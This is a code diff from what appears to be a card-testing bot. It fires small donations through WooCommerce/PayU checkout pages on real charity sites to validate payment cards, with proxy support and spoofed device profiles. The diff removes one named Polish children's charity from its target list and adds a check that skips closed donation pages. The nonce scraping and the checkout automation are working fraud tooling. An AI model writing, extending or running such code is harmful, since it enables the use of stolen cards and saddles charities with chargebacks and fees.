@@ -299,21 +299,6 @@ PAYU_SITES = {
             "locale": "pl",
         },
     },
-    "nadziejadladzieci": {
-        "create_type": "woocommerce",
-        "page_url": "https://www.nadziejadladzieci.pl/darowizna/",
-        "admin_ajax_url": "https://www.nadziejadladzieci.pl/wp-admin/admin-ajax.php",
-        "checkout_url": "https://www.nadziejadladzieci.pl/?wc-ajax=checkout",
-        "referer": "https://www.nadziejadladzieci.pl/darowizna/",
-        "origin": "https://www.nadziejadladzieci.pl",
-        "amount": "5",
-        "mcp_fx_table_id": 597551,
-        "mcp_fx_rate": 1,
-        "language": "pl",
-        "lang_param": "",
-        "country": "PL",
-        "timezone_offset": -60,
-    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -536,6 +521,8 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
             # step 1: GET the page -> extract nonces + postid + form_id
             r = await s.get(cfg["page_url"], headers={"Referer": cfg["referer"]})
             html = r.text
+            if "not available" in html.lower() or "currently not available" in html.lower():
+                raise Exception("woocommerce: donation project closed/not available")
             cn = re.search(r'woocommerce-process-checkout-nonce[^>]*value="([^"]+)"', html)
             sec = re.search(r'name="security"\s+value="([^"]+)"', html)
             pid = re.search(r'name="postid" value="([^"]+)"', html)
